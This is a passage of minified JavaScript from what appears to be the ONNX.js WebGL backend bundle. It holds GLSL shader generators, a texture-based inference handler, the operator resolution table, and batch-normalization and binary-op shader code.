rank=shape.length,dimOffset=outputRank-rank,funcName=`bcastMatmulIndices_${name}`;let block="";for(let i=0;i<rank-2;++i)block+=`\n          realIndices[${i}] = int( mod(float(bcastedIndices[${dimOffset+i}]), ${shape[i]}.0) );\n          `;const body=`\n        void ${funcName}(int bcastedIndices[${outputRank}], out int realIndices[${rank}]) {\n          ${block}\n          realIndices[${rank-1}] = bcastedIndices[${outputRank-1}];\n          realIndices[${rank-2}] = bcastedIndices[${outputRank-2}];\n        }\n        `;result[funcName]=new glsl_definitions_1.GlslLibRoutine(body)}})),result}indicesToOffset(){const result={};return this.context.programInfo.inputNames.forEach(((name,i)=>{const shape=this.context.inputTextureLayouts[i].shape,strides=this.context.inputTextureLayouts[i].strides,rank=shape.length;let funcName=`indicesToOffset_${name}`;result[funcName]=new glsl_definitions_1.GlslLibRoutine(ShapeUtilsGlslLib.indexToOffsetSingle(funcName,rank,strides)),funcName=`indicesToOffset_${name}_T`,result[funcName]=new glsl_definitions_1.GlslLibRoutine(ShapeUtilsGlslLib.indexToOffsetSingle(funcName,rank,strides.slice().reverse()))})),result}static indexToOffsetSingle(name,rank,strides){let block="";for(let i=rank-1;i>=0;--i)block+=`\n        offset += indices[${i}] * ${strides[i]};\n        `;return`\n      int ${name}(int indices[${rank}]) {\n        int offset = 0;\n        ${block}\n        return offset;\n      }\n      `}offsetToIndices(){const result={};return this.context.programInfo.inputNames.forEach(((name,i)=>{const shape=this.context.inputTextureLayouts[i].shape,strides=this.context.inputTextureLayouts[i].strides,rank=shape.length;let funcName=`offsetToIndices_${name}`;result[funcName]=new glsl_definitions_1.GlslLibRoutine(ShapeUtilsGlslLib.offsetToIndicesSingle(funcName,rank,strides)),funcName=`offsetToIndices_${name}_T`,result[funcName]=new glsl_definitions_1.GlslLibRoutine(ShapeUtilsGlslLib.offsetToIndicesSingle(funcName,rank,strides.slice().reverse()))})),result}static offsetToIndicesSingle(name,rank,strides){const stridesBlock=[];for(let i=0;i<rank-1;++i)stridesBlock.push(`\n      indices[${i}] = offset / ${strides[i]};`),stridesBlock.push(`\n        offset -= indices[${i}] * ${strides[i]};`);return stridesBlock.push(`\n      indices[${rank-1}] = offset;`),`\n      void ${name}(int offset, out int indices[${rank}]) {\n        ${stridesBlock.join("")}\n      }\n      `}incrementIndices(){const result={};return this.context.programInfo.inputNames.forEach(((name,i)=>{const shape=this.context.inputTextureLayouts[i].shape,rank=shape.length,funcName=`incrementIndices_${name}`;let shapeInit="";for(let i=0;i<rank;++i)shapeInit+=`\n        shape[${i}] = ${shape[i]};`;const body=`\n        void ${funcName}(int axis, out int indices[${rank}]) {\n          int shape[${rank}];\n          ${shapeInit};\n          for(int i = ${rank} -1 ; i >= 0; --i) {\n            if(i > axis) continue;\n            indices[i] += 1;\n            if(indices[i] < shape[i]) {\n              break;\n            }\n            indices[i] = 0;\n          }\n        }\n        `;result[funcName]=new glsl_definitions_1.GlslLibRoutine(body)})),result}}exports.ShapeUtilsGlslLib=ShapeUtilsGlslLib},"./lib/onnxjs/backends/webgl/glsl-source.ts":(__unused_webpack_module,exports)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.getDefaultFragShaderMain=exports.getFragShaderPreamble=exports.getVertexShaderSource=exports.getGlsl=void 0;const GLSL_ES_2_0={version:"",attribute:"attribute",varyingVertex:"varying",varyingFrag:"varying",texture2D:"texture2D",output:"gl_FragColor",outputDeclaration:""},GLSL_ES_3_0={version:"#version 300 es",attribute:"in",varyingVertex:"out",varyingFrag:"in",texture2D:"texture",output:"outputColor",outputDeclaration:"out vec4 outputColor;"};function getGlsl(version){return 1===version?GLSL_ES_2_0:GLSL_ES_3_0}exports.getGlsl=getGlsl,exports.getVertexShaderSource=function getVertexShaderSource(version){const glsl=getGlsl(version);return`${glsl.version}\n      precision highp float;\n      ${glsl.attribute} vec3 position;\n      ${glsl.attribute} vec2 textureCoord;\n\n      ${glsl.varyingVertex} vec2 TexCoords;\n\n      void main()\n      {\n          gl_Position = vec4(position, 1.0);\n          TexCoords = textureCoord;\n      }`},exports.getFragShaderPreamble=function getFragShaderPreamble(version){const glsl=getGlsl(version);return`${glsl.version}\n    precision highp float;\n    precision highp int;\n    precision highp sampler2D;\n    ${glsl.varyingFrag} vec2 TexCoords;\n    ${glsl.outputDeclaration}\n    const vec2 halfCR = vec2(0.5, 0.5);\n\n    // Custom vector types to handle higher dimenalities.\n    struct ivec5\n    {\n      int x;\n      int y;\n      int z;\n      int w;\n      int u;\n    };\n\n    struct ivec6\n    {\n      int x;\n      int y;\n      int z;\n      int w;\n      int u;\n      int v;\n    };\n\n    int imod(int x, int y) {\n      return x - y * (x / y);\n    }\n\n    `},exports.getDefaultFragShaderMain=function getDefaultFragShaderMain(version,outputShapeLength){return`\n  void main() {\n    int indices[${outputShapeLength}];\n    toVec(TexCoords, indices);\n    vec4 result = vec4(process(indices));\n    ${getGlsl(version).output} = result;\n  }\n  `}},"./lib/onnxjs/backends/webgl/glsl-vec-lib.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.VecGlslLib=void 0;const glsl_definitions_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-definitions.ts");class VecGlslLib extends glsl_definitions_1.GlslLib{constructor(context){super(context)}getCustomTypes(){return{}}getFunctions(){return Object.assign(Object.assign(Object.assign(Object.assign({},this.binaryVecFunctions()),this.copyVec()),this.setVecItem()),this.getVecItem())}binaryVecFunctions(){const rank=this.context.outputTextureLayout.shape.length,nameOp={add:"+=",sub:"-=",mul:"*=",div:"/="},result={};for(const name in nameOp){const fname=`${name}Vec`;let assignmentBlock="";for(let i=0;i<rank;++i)assignmentBlock+=`\n          dest[${i}] ${nameOp[name]} src[${i}];\n          `;const body=`\n        void ${fname}(int src[${rank}], out int dest[${rank}]) {\n          ${assignmentBlock}\n        }\n        `;result[fname]=new glsl_definitions_1.GlslLibRoutine(body)}return result}copyVec(){const rank=this.context.outputTextureLayout.shape.length;let assignmentBlock="";for(let i=0;i<rank;++i)assignmentBlock+=`\n        dest[${i}] = src[${i}];\n        `;const body=`\n      void copyVec(int src[${rank}], out int dest[${rank}]) {\n        ${assignmentBlock}\n      }\n      `;return{copyVec:new glsl_definitions_1.GlslLibRoutine(body)}}setVecItem(){const rank=this.context.outputTextureLayout.shape.length;let block=`\n        if(index < 0)\n            index =${rank} + index;\n        if (index == 0)\n            m[0] = value;\n        `;for(let i=1;i<rank-1;++i)block+=`\n        else if (index == ${i})\n            m[${i}] = value;\n            `;block+=`\n        else\n            m[${rank-1}] = value;\n        `;const body=`\n      void setVecItem(out int m[${rank}], int index, int value) {\n        ${block}\n      }\n        `;return{setVecItem:new glsl_definitions_1.GlslLibRoutine(body)}}getVecItem(){const rank=this.context.outputTextureLayout.shape.length;let block=`\n        if(index < 0)\n            index = ${rank} + index;\n        if (index == 0)\n            return m[0];\n      `;for(let i=1;i<rank-1;++i)block+=`\n        else if (index == ${i})\n            return m[${i}];\n      `;block+=`\n        else\n            return m[${rank-1}];\n        `;const body=`\n      int getVecItem(int m[${rank}], int index) {\n        ${block}\n      }\n    `;return{getVecItem:new glsl_definitions_1.GlslLibRoutine(body)}}}exports.VecGlslLib=VecGlslLib},"./lib/onnxjs/backends/webgl/inference-handler.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.WebGLInferenceHandler=void 0;const instrument_1=__webpack_require__("./lib/onnxjs/instrument.ts"),tensor_1=__webpack_require__("./lib/onnxjs/tensor.ts"),util_1=__webpack_require__("./lib/onnxjs/util.ts"),pack_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/pack.ts"),reshape_packed_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/reshape-packed.ts"),uint8_encode_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/uint8-encode.ts"),unpack_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/unpack.ts"),texture_layout_1=__webpack_require__("./lib/onnxjs/backends/webgl/texture-layout.ts"),types_1=__webpack_require__("./lib/onnxjs/backends/webgl/types.ts");exports.WebGLInferenceHandler=class WebGLInferenceHandler{constructor(session){this.session=session,this.packedTextureDataCache=new Map,this.unpackedTextureDataCache=new Map}calculateTextureWidthAndHeight(shape,textureType){return(0,texture_layout_1.calculateTextureWidthAndHeight)(this.session.layoutStrategy,shape,textureType)}executeProgram(program,inputs){if(inputs.length<program.inputNames.length)throw new Error(`Input size mustn't be less than ${program.inputNames.length}.`);if(program.inputNames.length!==program.inputTypes.length)throw new Error("input names size does not match input types");const inputTextureDatas=[];for(let i=0;i<program.inputNames.length;++i)inputTextureDatas[i]=this.getOrCreateTextureData(inputs[i],program.inputTypes[i]);const key=((programInfo,inputTextureDatas)=>{const inputs=inputTextureDatas.map((texture=>`${texture.unpackedShape.join(",")};${texture.width}x${texture.height}`)).join("_");let key=programInfo.name;return programInfo.cacheHint&&(key+="["+programInfo.cacheHint+"]"),key+=":"+inputs,key})(program,inputTextureDatas);let artifact=this.session.programManager.getArtifact(key);const programInfo=artifact?artifact.programInfo:"function"==typeof program.get?program.get():program,outputTextureLayout=(0,texture_layout_1.createTextureLayoutFromTextureType)(this.session.layoutStrategy,programInfo.output.dims,programInfo.output.textureType),outputTextureData=this.createTextureData(outputTextureLayout,programInfo.output.type);return artifact||(artifact=this.session.programManager.build(programInfo,inputTextureDatas,outputTextureData),this.session.programManager.setArtifact(key,artifact)),this.runProgram(artifact,inputTextureDatas,outputTextureData),outputTextureData}run(program,inputs){return this.executeProgram(program,inputs).tensor}runProgram(artifact,inputs,output){for(let i=0;i<inputs.length;++i)if(!!inputs[i].isPacked!=(artifact.programInfo.inputTypes[i]===types_1.TextureType.packed))throw new Error(`input[${i}] property packed inconsistent`);if(!!output.isPacked!=(artifact.programInfo.output.textureType===types_1.TextureType.packed))throw new Error("output property packed inconsistent");this.session.programManager.run(artifact,inputs,output)}getOrCreateTextureData(tensor,textureType){let td=this.getTextureData(tensor.dataId,textureType===types_1.TextureType.packed);if(!td&&(td=this.getTextureData(tensor.dataId,textureType!==types_1.TextureType.packed),td))return textureType===types_1.TextureType.packed?this.pack(td):this.unpack(td);if(!td){const layout=(0,texture_layout_1.createTextureLayoutFromTextureType)(this.session.layoutStrategy,tensor.dims,textureType);if(textureType===types_1.TextureType.packedLastDimension){const group=1,channels=4,shape=tensor.dims;if(4===shape.length){const adjustedKernelShape=[shape[0],Math.ceil(shape[1]*shape[2]*shape[3]/channels)],adjustedLayout=(0,texture_layout_1.createTextureLayoutFromTextureType)(this.session.layoutStrategy,adjustedKernelShape,textureType);let buffer=tensor.numberData;if(shape[1]*shape[2]*shape[3]%channels!=0){const numFeatureMaps=shape[0],oldRowSize=shape[1]*shape[2]*shape[3],newRowSize=Math.ceil(oldRowSize*group/channels)*channels;buffer=new Float32Array(numFeatureMaps*newRowSize);for(let f=0;f<numFeatureMaps;++f){const oldOffset=f*oldRowSize,newOffset=f*newRowSize+f%group*oldRowSize;buffer.set(tensor.numberData.subarray(oldOffset,oldOffset+oldRowSize),newOffset)}}return this.createTextureData(adjustedLayout,tensor.type,buffer,tensor,1)}}if(textureType===types_1.TextureType.packed){const unpackedTextureLayout=(0,texture_layout_1.createTextureLayoutFromShape)(this.session.layoutStrategy,tensor.dims,1,[],{reverseWH:!0}),unpackedTextureData=this.createTextureData(unpackedTextureLayout,tensor.type,tensor.numberData,tensor,1);td=this.pack(unpackedTextureData)}else td=this.createTextureData(layout,tensor.type,tensor.numberData,tensor,1)}return td}createTextureDataFromLayoutBindTensor(layout,dataType,data,tensor){return this.createTextureData(layout,dataType,data,tensor,1)}createTextureData(layout,dataType,data,tensor,usage){instrument_1.Logger.verbose("InferenceHandler",`Creating TextureData: layout:[${JSON.stringify(layout)}]`);const texture=this.session.textureManager.createTextureFromLayout(dataType,layout,data,usage);return this.createTextureDataFromTexture(layout,dataType,texture,tensor)}reshapeUnpacked(input,reshapedDims){const inputTD=this.getOrCreateTextureData(input,types_1.TextureType.unpacked),newTextureLayout={channels:inputTD.channels,height:inputTD.height,width:inputTD.width,shape:0!==reshapedDims.length?reshapedDims:[1],strides:util_1.ShapeUtil.computeStrides(reshapedDims),unpackedShape:reshapedDims};return this.createTextureDataFromTexture(newTextureLayout,input.type,inputTD.texture).tensor}reshapePacked(input,reshapedDims){const inputTD=this.getOrCreateTextureData(input,types_1.TextureType.packed);if((0,reshape_packed_1.isReshapeCheap)(input.dims,reshapedDims)){const newTextureLayout={channels:inputTD.channels,height:inputTD.height,width:inputTD.width,shape:0!==reshapedDims.length?reshapedDims:[1],strides:util_1.ShapeUtil.computeStrides(reshapedDims),unpackedShape:reshapedDims,isPacked:!0};return this.createTextureDataFromTexture(newTextureLayout,input.type,inputTD.texture).tensor}const squeezedInputShape=(0,reshape_packed_1.processDims3D)(input.dims),squeezedOutputShape=(0,reshape_packed_1.processDims3D)(reshapedDims),squeezedInputTensor=this.reshapePacked(input,squeezedInputShape),squeezedOutputTensor=this.run((0,reshape_packed_1.createPackedReshape3DProgramInfoLoader)(this,squeezedInputTensor,squeezedOutputShape),[squeezedInputTensor]);return this.reshapePacked(squeezedOutputTensor,reshapedDims)}cast(input,type){const inputTD=this.getOrCreateTextureData(input,types_1.TextureType.unpacked);return this.createTextureDataFromTexture(inputTD,type,inputTD.texture).tensor}createTextureDataFromTexture(layout,dataType,texture,tensor,tensorId){const textureData=Object.assign(Object.assign({},layout),{tensor:tensor||new tensor_1.Tensor(layout.unpackedShape,dataType,(_id=>this.readTexture(textureData)),(async _id=>this.readTextureAsync(textureData)),void 0,tensorId),texture:texture});return this.setTextureData(textureData.tensor.dataId,textureData,layout.isPacked),textureData}getTextureData(tensorId,isPacked=!1){return this.session.isInitializer(tensorId)?this.session.getTextureData(tensorId,isPacked):isPacked?this.packedTextureDataCache.get(tensorId):this.unpackedTextureDataCache.get(tensorId)}setTextureData(tensorId,td,isPacked=!1){this.session.isInitializer(tensorId)?this.session.setTextureData(tensorId,td,isPacked):(isPacked?this.packedTextureDataCache:this.unpackedTextureDataCache).set(tensorId,td)}isTextureLayoutCached(tensor,isPacked=!1){return!!this.getTextureData(tensor.dataId,isPacked)}dispose(){this.session.textureManager.clearActiveTextures(),this.packedTextureDataCache.forEach((td=>this.session.textureManager.releaseTexture(td))),this.packedTextureDataCache=new Map,this.unpackedTextureDataCache.forEach((td=>this.session.textureManager.releaseTexture(td))),this.unpackedTextureDataCache=new Map}readTexture(textureData){return textureData.isPacked?this.readTexture(this.unpack(textureData)):this.session.backend.glContext.isFloat32DownloadSupported?this.session.textureManager.readTexture(textureData,textureData.tensor.type,textureData.channels):this.session.textureManager.readUint8TextureAsFloat((0,uint8_encode_1.encodeAsUint8)(this,textureData))}async readTextureAsync(textureData){return textureData.isPacked?this.readTextureAsync(this.unpack(textureData)):this.session.backend.glContext.isFloat32DownloadSupported?this.session.textureManager.readTextureAsync(textureData,textureData.tensor.type,textureData.channels):this.session.textureManager.readUint8TextureAsFloat((0,uint8_encode_1.encodeAsUint8)(this,textureData))}pack(input){return this.executeProgram((0,pack_1.createPackProgramInfoLoader)(this,input.tensor),[input.tensor])}unpack(input){return this.executeProgram((0,unpack_1.createUnpackProgramInfoLoader)(this,input.tensor),[input.tensor])}}},"./lib/onnxjs/backends/webgl/op-resolve-rules.ts":function(__unused_webpack_module,exports,__webpack_require__){"use strict";var __createBinding=this&&this.__createBinding||(Object.create?function(o,m,k,k2){void 0===k2&&(k2=k);var desc=Object.getOwnPropertyDescriptor(m,k);desc&&!("get"in desc?!m.__esModule:desc.writable||desc.configurable)||(desc={enumerable:!0,get:function(){return m[k]}}),Object.defineProperty(o,k2,desc)}:function(o,m,k,k2){void 0===k2&&(k2=k),o[k2]=m[k]}),__setModuleDefault=this&&this.__setModuleDefault||(Object.create?function(o,v){Object.defineProperty(o,"default",{enumerable:!0,value:v})}:function(o,v){o.default=v}),__importStar=this&&this.__importStar||function(mod){if(mod&&mod.__esModule)return mod;var result={};if(null!=mod)for(var k in mod)"default"!==k&&Object.prototype.hasOwnProperty.call(mod,k)&&__createBinding(result,mod,k);return __setModuleDefault(result,mod),result};Object.defineProperty(exports,"__esModule",{value:!0}),exports.WEBGL_OP_RESOLVE_RULES=void 0;const batch_normalization_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/batch-normalization.ts"),binaryOps=__importStar(__webpack_require__("./lib/onnxjs/backends/webgl/ops/binary-op.ts")),cast_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/cast.ts"),concat_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/concat.ts"),conv_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/conv.ts"),conv_transpose_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/conv-transpose.ts"),depth_to_space_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/depth-to-space.ts"),flatten_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/flatten.ts"),gather_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/gather.ts"),gemm_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/gemm.ts"),image_scaler_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/image-scaler.ts"),instance_normalization_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/instance-normalization.ts"),lrn_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/lrn.ts"),matmul_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/matmul.ts"),pad_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/pad.ts"),pool_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/pool.ts"),reduce_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/reduce.ts"),reshape_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/reshape.ts"),resize_packed_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/resize-packed.ts"),shape_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/shape.ts"),slice_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/slice.ts"),softmax_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/softmax.ts"),split_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/split.ts"),squeeze_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/squeeze.ts"),sum_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/sum.ts"),tile_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/tile.ts"),transpose_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/transpose.ts"),unaryOps=__importStar(__webpack_require__("./lib/onnxjs/backends/webgl/ops/unary-op.ts")),unsqueeze_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/unsqueeze.ts"),upsample_1=__webpack_require__("./lib/onnxjs/backends/webgl/ops/upsample.ts");exports.WEBGL_OP_RESOLVE_RULES=[["Abs","","6+",unaryOps.abs],["Acos","","7+",unaryOps.acos],["Add","","7+",binaryOps.add],["And","","7+",binaryOps.and],["Asin","","7+",unaryOps.asin],["Atan","","7+",unaryOps.atan],["AveragePool","","7+",pool_1.averagePool,pool_1.parseAveragePoolAttributes],["BatchNormalization","","7+",batch_normalization_1.batchNormalization,batch_normalization_1.parseBatchNormalizationAttributes],["Cast","","6+",cast_1.cast,cast_1.parseCastAttributes],["Ceil","","6+",unaryOps.ceil],["Clip","","6-10",unaryOps.clip,unaryOps.parseClipAttributes],["Clip","","11+",unaryOps.clipV11],["Concat","","4+",concat_1.concat,concat_1.parseConcatAttributes],["Conv","","1+",conv_1.conv,conv_1.parseConvAttributes],["ConvTranspose","","1+",conv_transpose_1.convTranspose,conv_transpose_1.parseConvTransposeAttributes],["Cos","","7+",unaryOps.cos],["Div","","7+",binaryOps.div],["Dropout","","7+",unaryOps.identity],["DepthToSpace","","1+",depth_to_space_1.depthToSpace,depth_to_space_1.parseDepthToSpaceAttributes],["Equal","","7+",binaryOps.equal],["Elu","","6+",unaryOps.elu,unaryOps.parseEluAttributes],["Exp","","6+",unaryOps.exp],["Flatten","","1+",flatten_1.flatten,flatten_1.parseFlattenAttributes],["Floor","","6+",unaryOps.floor],["FusedConv","com.microsoft","1+",conv_1.conv,conv_1.parseConvAttributes],["Gather","","1+",gather_1.gather,gather_1.parseGatherAttributes],["Gemm","","7-10",gemm_1.gemm,gemm_1.parseGemmAttributesV7],["Gemm","","11+",gemm_1.gemm,gemm_1.parseGemmAttributesV11],["GlobalAveragePool","","1+",pool_1.globalAveragePool,pool_1.parseGlobalAveragePoolAttributes],["GlobalMaxPool","","1+",pool_1.globalMaxPool],["Greater","","7+",binaryOps.greater],["Identity","","1+",unaryOps.identity],["ImageScaler","","1+",image_scaler_1.imageScaler,image_scaler_1.parseImageScalerAttributes],["InstanceNormalization","","6+",instance_normalization_1.instanceNormalization,instance_normalization_1.parseInstanceNormalizationAttributes],["LeakyRelu","","6+",unaryOps.leakyRelu,unaryOps.parseLeakyReluAttributes],["Less","","7+",binaryOps.less],["LRN","","1+",lrn_1.lrn,lrn_1.parseLrnAttributes],["Log","","6+",unaryOps.log],["MatMul","","1+",matmul_1.matMul,matmul_1.parseMatMulAttributes],["MaxPool","","1+",pool_1.maxPool,pool_1.parseMaxPoolAttributes],["Mul","","7+",binaryOps.mul],["Neg","","6+",unaryOps.neg],["Not","","1+",unaryOps.not],["Or","","7+",binaryOps.or],["Pad","","2-10",pad_1.padV2,pad_1.parsePadAttributesV2],["Pad","","11+",pad_1.padV11,pad_1.parsePadAttributesV11],["Pow","","7+",binaryOps.pow],["PRelu","","7+",binaryOps.pRelu],["ReduceLogSum","","1+",reduce_1.reduceLogSum,reduce_1.parseReduceAttributes],["ReduceMax","","1+",reduce_1.reduceMax,reduce_1.parseReduceAttributes],["ReduceMean","","1+",reduce_1.reduceMean,reduce_1.parseReduceAttributes],["ReduceMin","","1+",reduce_1.reduceMin,reduce_1.parseReduceAttributes],["ReduceProd","","1+",reduce_1.reduceProd,reduce_1.parseReduceAttributes],["ReduceSum","","1-12",reduce_1.reduceSum,reduce_1.parseReduceAttributes],["ReduceSumSquare","","1+",reduce_1.reduceLogSumSquare,reduce_1.parseReduceAttributes],["Relu","","6+",unaryOps.relu],["Reshape","","5+",reshape_1.reshape],["Resize","","10",resize_packed_1.resize,resize_packed_1.parseResizeAttributesV10],["Resize","","11+",resize_packed_1.resize,resize_packed_1.parseResizeAttributesV11],["Shape","","1+",shape_1.shape],["Sigmoid","","6+",unaryOps.sigmoid],["Sin","","7+",unaryOps.sin],["Slice","","10+",slice_1.sliceV10],["Slice","","1-9",slice_1.slice,slice_1.parseSliceAttributes],["Softmax","","1-12",softmax_1.softmax,softmax_1.parseSoftmaxAttributes],["Softmax","","13+",softmax_1.softmaxV13,softmax_1.parseSoftmaxAttributesV13],["Split","","2-12",split_1.split,split_1.parseSplitAttributes],["Sqrt","","6+",unaryOps.sqrt],["Squeeze","","1-12",squeeze_1.squeeze,squeeze_1.parseSqueezeAttributes],["Squeeze","","13+",squeeze_1.squeezeV13],["Sub","","7+",binaryOps.sub],["Sum","","6+",sum_1.sum],["Tan","","7+",unaryOps.tan],["Tanh","","6+",unaryOps.tanh],["Tile","","6+",tile_1.tile],["Transpose","","1+",transpose_1.transpose,transpose_1.parseTransposeAttributes],["Upsample","","7-8",upsample_1.upsample,upsample_1.parseUpsampleAttributesV7],["Upsample","","9",upsample_1.upsample,upsample_1.parseUpsampleAttributesV9],["Unsqueeze","","1-12",unsqueeze_1.unsqueeze,unsqueeze_1.parseUnsqueezeAttributes],["Unsqueeze","","13+",unsqueeze_1.unsqueezeV13],["Xor","","7+",binaryOps.xor]]},"./lib/onnxjs/backends/webgl/ops/batch-normalization.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.parseBatchNormalizationAttributes=exports.batchNormalization=void 0;const attribute_with_cache_key_1=__webpack_require__("./lib/onnxjs/attribute-with-cache-key.ts"),glsl_source_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-source.ts"),types_1=__webpack_require__("./lib/onnxjs/backends/webgl/types.ts"),batchNormalizationProgramMetadata={name:"BatchNormalization",inputNames:["A","Scale","B","Mean","Variance"],inputTypes:[types_1.TextureType.unpacked,types_1.TextureType.unpacked,types_1.TextureType.unpacked,types_1.TextureType.unpacked,types_1.TextureType.unpacked]};exports.batchNormalization=(inferenceHandler,inputs,attributes)=>{validateInputs(inputs);return[inferenceHandler.run(Object.assign(Object.assign({},batchNormalizationProgramMetadata),{cacheHint:attributes.cacheKey,get:()=>createBatchNormalizationProgramInfo(inferenceHandler,inputs,attributes)}),inputs)]};exports.parseBatchNormalizationAttributes=node=>{const epsilon=node.attributes.getFloat("epsilon",1e-5),momentum=node.attributes.getFloat("momentum",.9),spatial=node.attributes.getInt("spatial",1);return(0,attribute_with_cache_key_1.createAttributeWithCacheKey)({epsilon:epsilon,momentum:momentum,spatial:spatial})};const createBatchNormalizationProgramInfo=(inferenceHandler,inputs,attributes)=>{const glsl=(0,glsl_source_1.getGlsl)(inferenceHandler.session.backend.glContext.version),rank=inputs[0].dims.length,[scaleWidth,scaleHeight]=inferenceHandler.calculateTextureWidthAndHeight(inputs[1].dims,types_1.TextureType.unpacked),shaderSource=`\n  float process(int[${rank}] indices) {\n    vec2 position = offsetToCoords(indices[1], ${scaleWidth}, ${scaleHeight});\n    float scale = getColorAsFloat(${glsl.texture2D}(Scale, position));\n    float mean = getColorAsFloat(${glsl.texture2D}(Mean, position));\n    float variance = getColorAsFloat(${glsl.texture2D}(Variance, position));\n    float b = getColorAsFloat(${glsl.texture2D}(B, position));\n\n    return scale * ( (_A(indices) - mean) / sqrt(variance + float(${attributes.epsilon})) ) + b;\n  }`;return Object.assign(Object.assign({},batchNormalizationProgramMetadata),{output:{dims:inputs[0].dims,type:inputs[0].type,textureType:types_1.TextureType.unpacked},shaderSource:shaderSource})},validateInputs=inputs=>{if(!inputs||5!==inputs.length)throw new Error("BatchNormalization requires 5 inputs.");const X=inputs[0],scale=inputs[1],B=inputs[2],mean=inputs[3],var_=inputs[4];if(X.dims.length<3||1!==scale.dims.length||1!==B.dims.length||1!==mean.dims.length||1!==var_.dims.length)throw new Error("invalid input shape.");if(scale.dims[0]!==X.dims[1]||B.dims[0]!==X.dims[1]||mean.dims[0]!==X.dims[1]||var_.dims[0]!==X.dims[1])throw new Error("invalid input shape.");if("float32"!==X.type&&"float64"!==X.type||"float32"!==scale.type&&"float64"!==scale.type||"float32"!==B.type&&"float64"!==B.type||"float32"!==mean.type&&"float64"!==mean.type||"float32"!==var_.type&&"float64"!==var_.type)throw new Error("invalid input tensor types.")}},"./lib/onnxjs/backends/webgl/ops/binary-op.ts":(__unused_webpack_module,exports,__webpack_require__)=>{"use strict";Object.defineProperty(exports,"__esModule",{value:!0}),exports.xor=exports.sub=exports.pRelu=exports.pow=exports.or=exports.mul=exports.less=exports.greater=exports.equal=exports.div=exports.and=exports.add=exports.glslPRelu=exports.glslPow=exports.glslXor=exports.glslOr=exports.glslAnd=exports.glslLess=exports.glslGreater=exports.glslEqual=exports.glslSub=exports.glslMul=exports.glslDiv=exports.glslAdd=void 0;const util_1=__webpack_require__("./lib/onnxjs/util.ts"),glsl_definitions_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-definitions.ts"),glsl_source_1=__webpack_require__("./lib/onnxjs/backends/webgl/glsl-source.ts"),types_1=__webpack_require__("./lib/onnxjs/backends/webgl/types.ts");function glslAdd(){return{body:"\n  float add_(float a, float b) {\n    return a + b;\n  }\n  vec4 add_(vec4 v1, vec4 v2) {\n    return v1 + v2;\n  }\n  ",name:"add_",type:glsl_definitions_1.FunctionType.ValueBased}}function glslDiv(){return{body:"\n  float div_(float a, float b) {\n    return a / b;\n  }\n  vec4 div_(vec4 v1, vec4 v2) {\n    return v1 / v2;\n  }\n  ",name:"div_",type:glsl_definitions_1.FunctionType.ValueBased}}function glslMul(){return{body:"\n  float mul_(float a, float b) {\n    return a * b;\n  }\n  vec4 mul_(vec4 v1, vec4 v2) {\n    return v1 * v2;\n  }\n  ",name:"mul_",type:glsl_definitions_1.FunctionType.ValueBased}}function glslSub(){return{body:"\n  float sub_(float a, float b) {\n    return a - b;\n  }\n  vec4 sub_(vec4 v1, vec4 v2) {\n    return v1 - v2;\n  }\n  ",name:"sub_",type:glsl_definitions_1.FunctionType.ValueBased}}function glslEqual(){return{body:"\n  float equal_(float a, float b) {\n    return float(a == b);\n  }\n  vec4 equal_(vec4 v1, vec4 v2) {\n    return vec4(equal(v1, v2));\n  }\n  ",name:"equal_",type:glsl_definitions_1.FunctionType.ValueBased}}function glslGreater(){const name="greater_";return{body:`\n  float ${name}(float a, float b) {\n    return float(a > b);\n  }\n  vec4 ${name}(vec4 v1, vec4 v2) {\n    return vec4( v1.r > v2.r ,\n      v1.g > v2.g,\n      v1.b > v2.b,\n      v1.a > v2.a );\n  }\n  `,name:name,type:glsl_definitions_1.FunctionType.ValueBased}}function glslLess(){return{body:"\n  float less_(float a, float b) {\n    return float(a < b);\n  }\n  vec4 less_(vec4 v1, vec4 v2) {\n    return vec4( v1.r < v2.r ,\n                v1.g < v2.g,\n                v1.b < v2.b,\n                v1.a < v2.a );\n  }\n  ",name:"less_",type:glsl_definitions_1.FunctionType.ValueBased}}function glslAnd(){return{body:"\n  float and_(float a, float b) {\n    return float( bool(a) && bool(b) );\n  }\n  vec4 and_(vec4 v1, vec4 v2) {\n    bvec4 b1 = bvec4(v1);\n    bvec4 b2 = bvec4(v2);\n    return vec4( b1.r && b2.r ,\n                b1.g && b2.g,\n                b1.b && b2.b,\n                b1.a && b2.a );\n  